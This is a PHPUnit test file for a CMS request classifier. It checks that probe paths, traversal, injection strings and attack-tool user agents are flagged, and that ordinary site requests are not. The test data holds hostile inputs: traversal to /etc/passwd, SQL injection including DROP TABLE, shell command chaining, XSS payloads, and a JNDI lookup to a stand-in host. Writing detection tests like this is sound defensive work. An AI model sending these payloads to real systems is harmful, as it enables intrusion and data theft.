<?php
/**
 * The built-in rule sets of the request classifier (settings/requestclassifier.ini): what each of them flags, and the
 * ordinary requests of an Exponential site none of them may flag. DB-less, no INI files.
 *
 *  RC-01  probes: WordPress, hidden files, database tools, server pages, backups and archives
 *  RC-02  traversal: ../ and ..\, %2e%2e in any case, double-encoded %252e, null bytes
 *  RC-03  injection: SQL, command, template and script signatures in the query or the path
 *  RC-04  scanner: the user agents of attack tools
 *  RC-06  the combined expression and the expressions one by one (with and without PCRE JIT) agree on every case
 *  RC-05  false positives: admin pages, ezjscore, the mega menu, the layouts API, searches with quotes and SQL words,
 *         downloads, stored images, packed scripts, robots.txt and sitemap.xml, our own clients (curl, Playwright)
 *
 * @copyright Copyright (C) 1998 - 2026 Exponential Foundation and 7x. All rights reserved.
 * @license GNU General Public License v2.0 (or any later version)
 * @package tests
 */

class expRequestClassifierRulesTest extends PHPUnit\Framework\TestCase
{
    const BROWSER = 'Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0';

    protected function setUp(): void
    {
        expRequestClassifier::reset( true );
    }

    /**
     * A classifier without INI files and without a cache file; the threshold set is left out (its own test).
     *
     * @param array $config
     * @return expRequestClassifier
     */
    public static function classifier( array $config = array() )
    {
        return new expRequestClassifier( $config + array(
            'ruleSets' => array( 'probes', 'traversal', 'injection', 'scanner' ),
            'compileCache' => false,
            'salt' => 'test-salt',
            'cacheDir' => sys_get_temp_dir() . '/rc-unused',
        ) );
    }

    /**
     * @param string $uri
     * @param array $values
     * @return expRequestVerdict|null
     */
    protected function verdict( $uri, array $values = array() )
    {
        $context = expRequestContext::create( $values + array( 'uri' => $uri, 'siteaccess' => 'site', 'userAgent' => self::BROWSER,
                                                               'ip' => '203.0.113.7', 'status' => 404 ) );
        // RC-06: the combined expression (PCRE JIT) and the expressions one by one (no JIT) give the same verdict
        try
        {
            expRequestPatternRuleSet::combinedIsFaster( true );
            $combined = self::classifier()->classify( $context );
            expRequestPatternRuleSet::combinedIsFaster( false );
            $each = self::classifier()->classify( $context );
        }
        finally
        {
            expRequestPatternRuleSet::combinedIsFaster( null );
        }
        $this->assertSame( $combined ? array( $combined->key(), $combined->detail ) : null, $each ? array( $each->key(), $each->detail ) : null,
                           'the same verdict with and without the combined expression: ' . $uri );
        return $combined;
    }

    public static function attacks()
    {
        return array(
            // RC-01 probes
            array( '/wp-login.php', 'probe/wp-login' ),
            array( '/site/wp-login.php', 'probe/wp-login' ),
            array( '/blog/wp-login.php?redirect_to=x', 'probe/wp-login' ),
            array( '/wp-admin/', 'probe/wp-admin' ),
            array( '/wp-admin/setup-config.php', 'probe/wp-admin' ),
            array( '/wp-content/plugins/x/readme.txt', 'probe/wp-content' ),
            array( '/wp-includes/wlwmanifest.xml', 'probe/wp-includes' ),
            array( '/wp-config.php.bak', 'probe/wp-config' ),
            array( '/xmlrpc.php', 'probe/xmlrpc' ),
            array( '/.env', 'probe/env' ),
            array( '/.env.production', 'probe/env' ),
            array( '/api/.env', 'probe/env' ),
            array( '/.git/config', 'probe/git' ),
            array( '/.git/HEAD', 'probe/git' ),
            array( '/.svn/entries', 'probe/vcs' ),
            array( '/.DS_Store', 'probe/ds-store' ),
            array( '/.htpasswd', 'probe/hidden' ),
            array( '/.aws/credentials', 'probe/hidden' ),
            array( '/phpmyadmin/index.php', 'probe/dbtool' ),
            array( '/phpMyAdmin-5.2.1/', 'probe/dbtool' ),
            array( '/pma/', 'probe/dbtool' ),
            array( '/adminer.php', 'probe/dbtool' ),
            array( '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 'probe/phpunit' ),
            array( '/cgi-bin/luci', 'probe/cgi-bin' ),
            array( '/server-status', 'probe/server-status' ),
            array( '/server-info', 'probe/server-status' ),
            array( '/actuator/health', 'probe/actuator' ),
            array( '/phpinfo.php', 'probe/phpinfo' ),
            array( '/composer.json', 'probe/config-file' ),
            array( '/settings/site.ini', 'probe/config-file' ),
            array( '/backup.zip', 'probe/backup' ),
            array( '/site.tar.gz', 'probe/backup' ),
            array( '/db.sql', 'probe/backup' ),
            array( '/old/site-backup.tar.gz', 'probe/backup' ),
            array( '/files/www.zip', 'probe/backup' ),
            array( '/index.php.bak', 'probe/backup-copy' ),
            array( '/config.old', 'probe/backup-copy' ),
            array( '/index.php~', 'probe/backup-copy' ),
            array( '/HNAP1/', 'probe/exploit' ),
            array( '/%2eenv', 'probe/env' ),
            // RC-02 traversal
            array( '/../../etc/passwd', 'traversal/dot-dot' ),
            array( '/index.php?file=../../../../etc/passwd', 'traversal/dot-dot' ),
            array( '/content/view/full/..\\..\\boot', 'traversal/dot-dot' ),
            array( '/%2e%2e/%2e%2e/etc/passwd', 'traversal/encoded-dot-dot' ),
            array( '/%2E%2E/%2E%2E/etc/passwd', 'traversal/encoded-dot-dot' ),
            array( '/static/..%2f..%2fetc/passwd', 'traversal/encoded-dot-dot' ),
            array( '/%252e%252e/%252e%252e/etc/passwd', 'traversal/double-encoded' ),
            array( '/image.php?f=logo.png%00.php', 'traversal/null-byte' ),
            // RC-03 injection
            array( '/content/view/full/2?id=1%20UNION%20SELECT%20password%20FROM%20ezuser', 'injection/sql-union' ),
            array( '/x?id=1+union+all+select+1,2,3', 'injection/sql-union' ),
            array( '/x?id=1/**/UNION/**/SELECT/**/1', 'injection/sql-union' ),
            array( "/user/login?Login=admin'%20or%20'1'='1", 'injection/sql-tautology' ),
            array( '/x?id=1%27%20OR%201=1--', 'injection/sql-tautology' ),
            array( '/x?id=1 and 1=1--', 'injection/sql-boolean' ),
            array( '/x?id=1%20AND%20SLEEP(5)', 'injection/sql-time' ),
            array( '/x?id=BENCHMARK(1000000,MD5(1))', 'injection/sql-time' ),
            array( '/x?q=1 from information_schema.tables', 'injection/sql-schema' ),
            array( '/x?id=1;DROP TABLE ezuser', 'injection/sql-stacked' ),
            array( '/x?file=;cat%20/etc/passwd', 'injection/cmd-chain' ),
            array( '/x?file=/etc/passwd', 'injection/cmd-file' ),
            array( '/x?host=127.0.0.1;id', 'injection/cmd-chain' ),
            array( '/x?host=127.0.0.1|id', 'injection/cmd-chain' ),
            array( '/x?q=$(whoami)', 'injection/cmd-chain' ),
            array( '/x?q=%60id%60', 'injection/cmd-chain' ),
            array( '/x?name={{7*7}}', 'injection/ssti' ),
            array( '/x?name=${7*7}', 'injection/ssti' ),
            array( '/x?name=%23{7*7}', 'injection/ssti' ),
            array( '/x?name=<%25=%207*7%20%25>', 'injection/ssti' ),
            array( '/x?q=${jndi:ldap://evil.example/a}', 'injection/jndi' ),
            array( '/x?q=<script>alert(1)</script>', 'injection/xss-script' ),
            array( '/x?q=%253Cscript%253Ealert(1)', 'injection/xss-script' ),
            array( '/x?q=<img src=x onerror=alert(1)>', 'injection/xss-event' ),
            array( '/x?q=<svg/onload=alert(1)>', 'injection/xss-event' ),
            array( '/x?q="onmouseover="alert(1)', 'injection/xss-event' ),
            array( '/user/login?redirect=javascript:alert(1)', 'injection/xss-url' ),
            array( '/x?page=php://filter/convert.base64-encode/resource=index', 'injection/php-code' ),
            array( '/content/search?SearchText=x%3C%3Fphp%20system(1)', 'injection/php-code' ),
        );
    }

    /**
     * RC-01 .. RC-03
     */
    #[\PHPUnit\Framework\Attributes\DataProvider('attacks')]
    public function testAttacksAreFlagged( $uri, $expected )
    {
        $verdict = $this->verdict( $uri );
        $this->assertNotNull( $verdict, $uri );
        $this->assertSame( $expected, $verdict->key(), $uri );
        $this->assertContains( $verdict->confidence, array( 'low', 'medium', 'high' ) );
    }

    public static function scanners()
    {
        return array(
            array( 'sqlmap/1.8.2#stable (https://sqlmap.org)', 'sqlmap' ),
            array( 'Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000001)', 'nikto' ),
            array( 'Mozilla/5.0 (Windows NT 10.0) Nuclei - Open-source project (github.com/projectdiscovery/nuclei)', 'nuclei' ),
            array( 'masscan/1.3 (https://github.com/robertdavidgraham/masscan)', 'masscan' ),
            array( 'Mozilla/5.0 zgrab/0.x', 'zgrab' ),
            array( 'WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)', 'wpscan' ),
            array( 'DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)', 'dirbuster' ),
            array( 'gobuster/3.6', 'gobuster' ),
            array( 'Fuzz Faster U Fool v2.1.0-dev', 'ffuf' ),
            array( 'Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)', 'nmap' ),
            array( 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) acunetix_wvs_security_test', 'acunetix' ),
            array( 'Mozilla/5.0 (compatible; Netsparker)', 'netsparker' ),
            array( 'w3af.org', 'w3af' ),
            array( 'Mozilla/5.0 OpenVAS-VT 23.0', 'openvas' ),
            array( 'Jaeles/0.17', 'jaeles' ),
            array( 'feroxbuster/2.10.4', 'feroxbuster' ),
            array( 'Mozilla/4.0 (Hydra)', 'hydra' ),
        );
    }

    /**
     * RC-04
     */
    #[\PHPUnit\Framework\Attributes\DataProvider('scanners')]
    public function testScannerUserAgents( $userAgent, $rule )
    {
        $verdict = $this->verdict( '/', array( 'userAgent' => $userAgent, 'status' => 200 ) );
        $this->assertNotNull( $verdict, $userAgent );
        $this->assertSame( 'scanner/' . $rule, $verdict->key() );
    }

    public static function ordinary()
    {
        return array(
            // admin pages, under the admin siteaccess
            array( '/admin/content/view/full/2', 'admin' ),
            array( '/admin/content/edit/57/f/eng-GB', 'admin' ),
            array( '/admin/setup/logs/view/error', 'admin' ),
            array( '/admin/setup/logs/view/security?q=probe%2Fwp-login', 'admin' ),
            array( '/admin/setup/cache', 'admin' ),
            array( '/admin/user/login?redirect=%2Fadmin%2Fcontent%2Fview%2Ffull%2F2', 'admin' ),
            array( '/admin/content/action', 'admin' ),
            array( '/admin/content/view/full/2/(offset)/20', 'admin' ),
            // ezjscore
            array( '/ezjscore/call/ezjsctemplate::foo', 'site' ),
            array( '/admin/ezjscore/run/content/view/full/2', 'admin' ),
            array( '/ezjscore/call/ezoe::search::x?ContentType=json', 'site' ),
            array( '/admin/ezjscore/call/ezjscnode::subtree::2::0::10::published::1?ContentType=json', 'admin' ),
            array( '/var/cache/public/javascript/4f1c2e_all.js', 'site' ),
            array( '/var/site/cache/public/stylesheets/a1b2c3_all.css', 'site' ),
            // the mega menu (design/admin4/javascript/a4_mega_menu.js fetches user/megamenu/<tab>)
            array( '/admin/user/megamenu/content', 'admin' ),
            array( '/admin/user/megamenu/setup', 'admin' ),
            // the layouts API
            array( '/admin/explayouts_ui_api/app/api/en/layouts/12/zones/main/blocks', 'admin' ),
            array( '/admin/explayouts_ui_api/app/api/en/layouts/12?_method=PATCH', 'admin' ),
            array( '/admin/explayouts_ui_api/app/api/layouts/shared', 'admin' ),
            // searches
            array( '/content/search?SearchText=%22union+station%22', 'site' ),
            array( '/content/search?SearchText=O%27Reilly', 'site' ),
            array( "/content/search?SearchText=O'Reilly+and+Sons", 'site' ),
            array( '/content/search?SearchText=select+or+drop', 'site' ),
            array( '/content/search?SearchText=%3Cb%3E', 'site' ),
            array( '/content/search?SearchText=sleep+well', 'site' ),
            array( '/content/search?SearchText=rock+%26+roll&SubTreeArray[]=2', 'site' ),
            array( '/content/search?SearchText=100%25+cotton', 'site' ),
            array( '/content/search?SearchText=who+am+I%3F', 'site' ),
            array( '/content/search?SearchText=C%23+and+.NET', 'site' ),
            // downloads, stored files, assets
            array( '/content/download/123/456/file/backup.zip', 'site' ),
            array( '/content/download/123/456/version/2/file/db.sql', 'site' ),
            array( '/var/site/storage/images/media/images/logo/123-1-eng-GB/logo_large.png', 'site' ),
            array( '/var/storage/original/application/report.tar.gz', 'site' ),
            array( '/extension/ezjscore/design/standard/javascript/jquery-4.0.0.min.js', 'site' ),
            array( '/design/admin4/stylesheets/components.css', 'site' ),
            array( '/share/icons/crystal-admin/16x16/apps/kfm_home.png', 'site' ),
            // site pages
            array( '/site/user/password', 'site' ),
            array( '/user/register', 'site' ),
            array( '/robots.txt', 'site' ),
            array( '/sitemap.xml', 'site' ),
            array( '/sitemap.xml.gz', 'site' ),
            array( '/favicon.ico', 'site' ),
            array( '/Fit-Healthy', 'site' ),
            array( '/news/2026/fit-and-healthy?utm_source=newsletter&utm_medium=email', 'site' ),
            array( '/content/view/full/2/(year)/2026', 'site' ),
            array( '/layout/set/print/content/view/full/89', 'site' ),
            array( '/content/view/sitemap/2', 'site' ),
            array( '/Shop/Information-environment', 'site' ),
            array( '/About/Who-we-are', 'site' ),
            array( '/Blog/Select-or-drop-your-favourites', 'site' ),
            array( '/Blog/My-environment', 'site' ),
            array( '/Blog/Get-info-about-PHP', 'site' ),
        );
    }

    /**
     * RC-05
     */
    #[\PHPUnit\Framework\Attributes\DataProvider('ordinary')]
    public function testOrdinaryRequestsAreNotFlagged( $uri, $siteaccess )
    {
        foreach ( array( 200, 404 ) as $status )
        {
            $verdict = $this->verdict( $uri, array( 'siteaccess' => $siteaccess, 'status' => $status ) );
            $this->assertNull( $verdict, $uri . ' flagged as ' . ( $verdict ? $verdict->key() . ' (' . $verdict->detail . ')' : '' ) );
        }
    }

    /** RC-05: the site's own clients and search engines are no scanners */
    public function testOwnClientsAreNoScanners()
    {
        foreach ( array( 'curl/8.5.0', 'Wget/1.21.4', 'python-requests/2.32.3',
                         'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.0.0 Safari/537.36',
                         'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Playwright/1.48',
                         'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
                         'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
                         'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148', '' ) as $userAgent )
        {
            $this->assertNull( $this->verdict( '/', array( 'userAgent' => $userAgent, 'status' => 200 ) ), $userAgent );
        }
    }
}
